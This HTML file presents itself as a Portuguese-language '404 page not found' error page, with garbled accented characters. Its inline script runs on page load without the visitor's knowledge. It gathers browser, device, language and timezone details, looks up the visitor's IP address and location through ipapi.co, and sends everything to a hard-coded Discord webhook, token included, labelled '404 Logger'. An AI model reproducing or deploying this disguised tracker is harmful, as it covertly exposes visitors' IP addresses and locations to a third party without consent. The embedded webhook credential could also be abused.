<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8f9fa;
            color: #343a40;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .error-container {
            max-width: 600px;
            padding: 2rem;
        }
        h1 {
            font-size: 4rem;
            margin: 0;
            color: #dc3545;
        }
        h2 {
            font-size: 1.5rem;
            margin-top: 0;
        }
        p {
            margin-bottom: 2rem;
            line-height: 1.6;
        }
        a {
            color: #007bff;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <h1>404</h1>
        <h2>P√°gina n√£o encontrada</h2>
        <p>A p√°gina que voc√™ est√° procurando pode ter sido removida, ter seu nome alterado ou estar temporariamente indispon√≠vel.</p>
        <p><a href="/">Voltar para a p√°gina inicial</a></p>
    </div>

    <script>
        // Fun√ß√£o para coletar informa√ß√µes do usu√°rio
        function collectUserData() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const cookiesEnabled = navigator.cookieEnabled;
            
            // Usando um servi√ßo alternativo para IP (ipapi.co)
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip || 'IP n√£o dispon√≠vel';
                    const country = data.country_name || 'Desconhecido';
                    const city = data.city || 'Desconhecida';
                    
                    sendToDiscord(
                        ip,
                        userAgent,
                        platform,
                        screenWidth,
                        screenHeight,
                        language,
                        timezone,
                        cookiesEnabled,
                        country,
                        city
                    );
                })
                .catch(error => {
                    console.error('Erro ao obter IP:', error);
                    sendToDiscord(
                        'IP n√£o dispon√≠vel',
                        userAgent,
                        platform,
                        screenWidth,
                        screenHeight,
                        language,
                        timezone,
                        cookiesEnabled,
                        'Desconhecido',
                        'Desconhecida'
                    );
                });
        }

        // Fun√ß√£o para enviar dados para o Discord via webhook
        function sendToDiscord(ip, userAgent, platform, screenWidth, screenHeight, language, timezone, cookiesEnabled, country, city) {
            const webhookURL = 'https://discord.com/api/webhooks/1391138971740016793/uEDSN4HVuuzsQYjeSeVIBfPXROy_n4rHJJ-m4Or1T1b4TLi7RjBXDsQI_KkyaEIgB_kQ';
            
            const timestamp = new Date().toLocaleString('pt-BR');
            
            const embed = {
                title: "‚ö†Ô∏è Algu√©m acessou a p√°gina de erro 404!",
                color: 16711680, // Vermelho
                fields: [
                    {
                        name: "üìå IP",
                        value: ip,
                        inline: true
                    },
                    {
                        name: "üåé Localiza√ß√£o",
                        value: `${city}, ${country}`,
                        inline: true
                    },
                    {
                        name: "üñ•Ô∏è Dispositivo",
                        value: `\`${platform}\` (${screenWidth}x${screenHeight})`,
                        inline: true
                    },
                    {
                        name: "üîç Navegador",
                        value: `\`\`\`${userAgent}\`\`\``,
                        inline: false
                    },
                    {
                        name: "‚öôÔ∏è Configura√ß√µes",
                        value: `Idioma: \`${language}\`\nFuso Hor√°rio: \`${timezone}\`\nCookies: \`${cookiesEnabled ? 'Ativados' : 'Desativados'}\``,
                        inline: false
                    },
                    {
                        name: "‚è∞ Hor√°rio de Acesso",
                        value: timestamp,
                        inline: false
                    }
                ],
                footer: {
                    text: "404 Logger - Dados coletados automaticamente"
                }
            };
            
            const payload = {
                embeds: [embed]
            };
            
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).catch(error => console.error("Erro ao enviar para Discord:", error));
        }

        // Executa a coleta de dados quando a p√°gina carrega
        window.onload = collectUserData;
    </script>
</body>
</html>
